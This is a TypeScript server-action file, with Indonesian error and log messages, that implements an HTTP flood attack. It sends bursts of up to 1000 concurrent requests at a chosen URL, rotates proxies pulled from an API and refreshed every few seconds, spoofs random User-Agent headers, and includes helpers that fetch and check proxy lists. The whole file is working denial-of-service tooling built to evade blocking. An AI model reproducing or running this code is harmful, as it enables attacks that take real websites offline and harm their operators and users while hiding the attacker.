
"use server";

import { HttpsProxyAgent } from "https-proxy-agent";
import { USER_AGENTS } from "@/lib/user-agents";

export interface FloodStats {
  totalSent: number;
  successful: number;
  failed: number;
  error?: string;
  statusCodeCounts?: Record<number, number>;
}

const METHODS_WITHOUT_BODY = ["GET", "HEAD", "DELETE", "OPTIONS"];
const PROXY_TEST_URL = "https://www.google.com/generate_204";
const PROXY_TEST_TIMEOUT_MS = 7000;
const CONCURRENT_PROXY_CHECKS = 10;
const PROXY_REFRESH_INTERVAL_MS = 5000; // 5 seconds for dynamic proxy refresh

// Helper to sanitize and validate individual proxy entries
const sanitizeProxyEntry = (entry: string): string | null => {
  const trimmed = entry.trim();
  const withoutScheme = trimmed.replace(/^(http(s)?:\/\/)/i, '');
  // Basic validation: must contain a colon and not be just a scheme
  if (withoutScheme.includes(':') && withoutScheme.lastIndexOf(':') > 0 && withoutScheme.length > 3) {
    return withoutScheme;
  }
  return null;
};

export async function startFloodAttack(
  targetUrl: string,
  method: string,
  headersString?: string,
  body?: string,
  concurrency?: number,
  rate?: number,
  durationInSeconds?: number,
  proxiesString?: string, // Proxies from textarea
  proxyApiUrl?: string    // API URL for dynamic fetching
): Promise<FloodStats> {
  let parsedUrl: URL;
  try {
    parsedUrl = new URL(targetUrl);
  } catch (e) {
    return { totalSent: 0, successful: 0, failed: 0, error: "URL target tidak valid. Harap sertakan skema (mis., http:// atau https://)." };
  }

  if (parsedUrl.protocol !== "http:" && parsedUrl.protocol !== "https:") {
     return { totalSent: 0, successful: 0, failed: 0, error: "URL target harus menggunakan protokol http atau https." };
  }

  const safeConcurrency = Math.min(Math.max(1, concurrency ?? 50), 1000);
  const safeRate = Math.min(Math.max(1, rate ?? 50), 1000);
  const safeDuration = Math.min(Math.max(5, durationInSeconds ?? 10), 60);

  if (safeConcurrency <= 0 || safeRate <= 0 || safeDuration <=0) {
    return { totalSent: 0, successful: 0, failed: 0, error: "Konkurensi, tingkat, dan durasi harus bernilai positif." };
  }

  const parsedHeaders: HeadersInit = {};
  let customUserAgentProvided = false;
  if (headersString) {
    headersString.split('\n').forEach(line => {
      const parts = line.split(':');
      if (parts.length >= 2) {
        const key = parts[0].trim();
        const value = parts.slice(1).join(':').trim();
        if (key && value) {
          parsedHeaders[key] = value;
          if (key.toLowerCase() === 'user-agent') {
            customUserAgentProvided = true;
          }
        }
      }
    });
  }

  const baseFetchOptions: RequestInit = {
    method: method.toUpperCase(),
    signal: AbortSignal.timeout(5000)
  };

  if (body && !METHODS_WITHOUT_BODY.includes(method.toUpperCase())) {
    baseFetchOptions.body = body;
    const hasContentType = Object.keys(parsedHeaders).some(key => key.toLowerCase() === 'content-type');
    if (!hasContentType) {
        try {
            JSON.parse(body);
            parsedHeaders['Content-Type'] = 'application/json';
        } catch (e) {
            parsedHeaders['Content-Type'] = 'text/plain';
        }
    }
  }

  let currentActiveProxies: string[] = [];
  let lastProxyRefreshTime = 0;

  const tryFetchFromApi = async (url: string): Promise<string[] | null> => {
    try {
        const response = await fetch(url, { signal: AbortSignal.timeout(7000), headers: { 'Accept': 'text/plain' } });
        if (response.ok) {
            const text = await response.text();
            if (text.trim()) {
                const lines = text.trim().split('\n');
                const sanitizedProxies = lines.map(sanitizeProxyEntry).filter(p => p !== null) as string[];
                if (sanitizedProxies.length > 0) return sanitizedProxies;
                console.warn(`Proxy API ${url} returned empty or no valid ip:port entries after sanitization.`);
            } else {
                console.warn(`Proxy API ${url} returned empty content during fetch operation.`);
            }
        } else {
             console.warn(`Failed to fetch proxies from ${url}: ${response.status} ${response.statusText}`);
        }
    } catch (e: any) {
        console.error(`Error fetching proxies from ${url}:`, e.message);
    }
    return null;
  };

  const parseProxiesFromString = (str: string | undefined): string[] => {
    if (!str || !str.trim()) return [];
    const sanitizedProxies = str.split('\n')
        .map(sanitizeProxyEntry)
        .filter(p => p !== null) as string[];
    if (sanitizedProxies.length === 0 && str.trim().length > 0) {
        console.warn("Provided proxiesString from textarea could not be parsed into valid ip:port entries after sanitization.");
    }
    return sanitizedProxies;
  };

  // Initial proxy setup
  if (proxyApiUrl) {
    console.log("Attempting initial proxy fetch from API:", proxyApiUrl);
    const apiProxies = await tryFetchFromApi(proxyApiUrl);
    if (apiProxies && apiProxies.length > 0) {
        currentActiveProxies = apiProxies;
        lastProxyRefreshTime = Date.now();
        console.log(`Initialized with ${currentActiveProxies.length} proxies from API.`);
    } else {
        console.warn("Initial API proxy fetch failed or returned no valid proxies. Checking textarea for fallback.");
        currentActiveProxies = parseProxiesFromString(proxiesString);
        if (currentActiveProxies.length > 0) {
            console.log(`Initialized with ${currentActiveProxies.length} proxies from textarea (API fallback).`);
        } else if (proxiesString && proxiesString.trim().length > 0){
             return { totalSent: 0, successful: 0, failed: 0, error: "Gagal mengambil proksi dari API dan string proksi dari textarea tidak valid atau tidak menghasilkan entri ip:port yang valid setelah pembersihan." };
        } else {
            console.log("No proxies available from API or textarea for initial load.");
        }
    }
  } else {
    currentActiveProxies = parseProxiesFromString(proxiesString);
    if (currentActiveProxies.length > 0) {
        console.log(`Initialized with ${currentActiveProxies.length} proxies from textarea.`);
    } else if (proxiesString && proxiesString.trim().length > 0) {
        return { totalSent: 0, successful: 0, failed: 0, error: "String proksi dari textarea tidak valid atau tidak menghasilkan entri ip:port yang valid setelah pembersihan. Tidak ada URL API yang diberikan." };
    } else {
        console.log("No proxies provided via textarea or API URL.");
    }
  }

  let totalSent = 0;
  let successful = 0;
  let failed = 0;
  const statusCodeCounts: Record<number, number> = {};
  const startTime = Date.now();
  const endTime = startTime + safeDuration * 1000;

  console.log(`Mulai banjir: ${method} ${targetUrl}, Konkurensi: ${safeConcurrency}, Tingkat: ${safeRate} RPS, Durasi: ${safeDuration}d, Proksi awal: ${currentActiveProxies.length}, API Proksi: ${proxyApiUrl ?? 'Tidak ada'}`);

  try {
    while (Date.now() < endTime) {
      if (proxyApiUrl && (Date.now() - lastProxyRefreshTime > PROXY_REFRESH_INTERVAL_MS)) {
        console.log("Refreshing proxies from API:", proxyApiUrl);
        const newApiProxies = await tryFetchFromApi(proxyApiUrl);
        if (newApiProxies && newApiProxies.length > 0) {
            currentActiveProxies = newApiProxies;
            lastProxyRefreshTime = Date.now();
            console.log(`Refreshed. Now using ${currentActiveProxies.length} proxies from API. Total sent: ${totalSent}`);
        } else {
            console.warn("Proxy refresh from API failed or returned no valid proxies. Continuing with existing proxy list (if any).");
        }
      }

      const batchStartTime = Date.now();
      const requestsInBatch: Promise<void>[] = [];
      const numRequestsThisBurst = safeConcurrency;

      for (let i = 0; i < numRequestsThisBurst; i++) {
        if (Date.now() >= endTime) break;

        let currentFetchOptions = { ...baseFetchOptions };
        const currentHeaders = {...parsedHeaders};

        if (!customUserAgentProvided && USER_AGENTS.length > 0) {
            currentHeaders['User-Agent'] = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
        }
        currentFetchOptions.headers = currentHeaders;

        if (currentActiveProxies.length > 0) {
          const proxyConfig = currentActiveProxies[totalSent % currentActiveProxies.length];
          // The HttpsProxyAgent expects the proxy string without the scheme, e.g., "user:pass@host:port" or "host:port"
          try {
            const agent = new HttpsProxyAgent(`http://${proxyConfig}`); // HttpsProxyAgent needs a scheme for its internal URL parsing, but it uses the host/port/auth from it.
            currentFetchOptions.agent = agent as any;
          } catch (e) {
            console.error(`Error creating proxy agent for ${proxyConfig}:`, e);
            failed++;
            statusCodeCounts[-1] = (statusCodeCounts[-1] || 0) + 1; // Mark as network/proxy error
            totalSent++;
            continue;
          }
        }

        requestsInBatch.push(
          fetch(targetUrl, currentFetchOptions)
            .then(response => {
              const status = response.status;
              statusCodeCounts[status] = (statusCodeCounts[status] || 0) + 1;
              if (response.status >= 200 && response.status < 400) {
                successful++;
              } else {
                failed++;
              }
            })
            .catch((e: any) => {
              failed++;
              if (e.name === 'AbortError' || e.name === 'TimeoutError') {
                 statusCodeCounts[0] = (statusCodeCounts[0] || 0) + 1; // Mark as timeout/abort
              } else {
                 statusCodeCounts[-1] = (statusCodeCounts[-1] || 0) + 1; // Mark as other network/proxy error
              }
            })
            .finally(() => {
              totalSent++;
            })
        );
      }

      await Promise.allSettled(requestsInBatch);

      if (Date.now() >= endTime) break;

      const batchDurationMs = Date.now() - batchStartTime;
      const targetBatchIntervalMs = (numRequestsThisBurst / safeRate) * 1000;
      const delayMs = Math.max(0, targetBatchIntervalMs - batchDurationMs);

      if (delayMs > 0) {
        await new Promise(resolve => setTimeout(resolve, delayMs));
      }
    }
  } catch (e: any) {
    console.error("Kesalahan serangan banjir:", e);
    return { totalSent, successful, failed, statusCodeCounts, error: e.message || "Terjadi kesalahan tak terduga selama banjir." };
  } finally {
    console.log(`Banjir berakhir: Total Terkirim: ${totalSent}, Berhasil: ${successful}, Gagal: ${failed}, Kode Status: ${JSON.stringify(statusCodeCounts)}`);
  }

  return { totalSent, successful, failed, statusCodeCounts };
}

export async function fetchProxiesFromUrl(apiUrl: string): Promise<{ proxies?: string; error?: string }> {
  if (!apiUrl.trim()) {
    return { error: "URL API tidak boleh kosong." };
  }
  try {
    new URL(apiUrl); // Validates URL format
  } catch (e) {
    return { error: "Format URL API tidak valid. Harap sertakan skema (mis., http:// atau https://)." };
  }

  try {
    const response = await fetch(apiUrl, {
      signal: AbortSignal.timeout(10000), // 10-second timeout for fetching proxies
      headers: { 'Accept': 'text/plain' }
    });
    if (!response.ok) {
      return { error: `Permintaan API gagal dengan status ${response.status}: ${response.statusText}` };
    }
    const text = await response.text();
    if (!text.trim()) {
      return { error: "API mengembalikan daftar proksi kosong." };
    }

    const lines = text.trim().split('\n');
    const sanitizedProxies = lines.map(sanitizeProxyEntry).filter(p => p !== null) as string[];

    if (sanitizedProxies.length === 0) {
        return { error: "API tidak mengembalikan entri proksi yang valid dalam format ip:port setelah pembersihan." };
    }

    return { proxies: sanitizedProxies.join('\n') };
  } catch (e: any) {
    console.error("Kesalahan mengambil proksi dari API:", e);
    if (e.name === 'TimeoutError') {
        return { error: "Waktu permintaan API habis." };
    }
    return { error: e.message || "Gagal mengambil proksi. Periksa konsol browser untuk detail lebih lanjut." };
  }
}


export async function checkProxies(proxiesString: string): Promise<{
  liveProxiesString: string;
  liveCount: number;
  deadCount: number;
  totalChecked: number;
  error?: string;
}> {
  if (!proxiesString || proxiesString.trim() === "") {
    return { liveProxiesString: "", liveCount: 0, deadCount: 0, totalChecked: 0 };
  }

  // ProxiesString is expected to be pre-validated by the form (no http schemes)
  // or pre-sanitized if coming from an internal source.
  // This function primarily focuses on reachability.
  const proxyEntries = proxiesString.split('\n')
    .map(line => line.trim())
    .filter(line => {
      // Ensure no schemes and basic host:port structure
      if (line.startsWith("http://") || line.startsWith("https://")) return false;
      return line.includes(':') && line.lastIndexOf(':') > 0 && line.length > 3;
    });

  if (proxyEntries.length === 0) {
    return { liveProxiesString: "", liveCount: 0, deadCount: 0, totalChecked: 0, error: "Tidak ada proksi dalam format host:port yang benar ditemukan untuk diperiksa. Pastikan skema http(s):// telah dihapus." };
  }

  const liveProxiesArray: string[] = [];
  let deadCount = 0;

  const checkSingleProxy = async (proxyUrl: string): Promise<boolean> => {
    try {
      // HttpsProxyAgent needs a scheme for its internal URL parsing.
      // The proxyUrl itself should be scheme-less, e.g., "user:pass@host:port" or "host:port"
      const agent = new HttpsProxyAgent(`http://${proxyUrl}`);
      const response = await fetch(PROXY_TEST_URL, {
        agent: agent as any,
        signal: AbortSignal.timeout(PROXY_TEST_TIMEOUT_MS),
        redirect: 'manual', // We only care about reachability, not the content of the redirect
      });
      // Google's generate_204 returns 204. Other test URLs might return 200.
      return response.status === 204 || response.status === 200;
    } catch (error: any) {
      // console.warn(`Proxy check failed for ${proxyUrl}: ${error.message}`);
      return false;
    }
  };

  for (let i = 0; i < proxyEntries.length; i += CONCURRENT_PROXY_CHECKS) {
    const batch = proxyEntries.slice(i, i + CONCURRENT_PROXY_CHECKS);
    const results = await Promise.allSettled(
      batch.map(proxy => checkSingleProxy(proxy).then(isLive => ({ proxy, isLive })))
    );

    results.forEach(result => {
      if (result.status === 'fulfilled') {
        if (result.value.isLive) {
          liveProxiesArray.push(result.value.proxy);
        } else {
          deadCount++;
        }
      } else {
        // Promise rejected (e.g., unexpected error in checkSingleProxy)
        deadCount++;
      }
    });
  }

  return {
    liveProxiesString: liveProxiesArray.join('\n'),
    liveCount: liveProxiesArray.length,
    deadCount: deadCount,
    totalChecked: proxyEntries.length,
  };
}

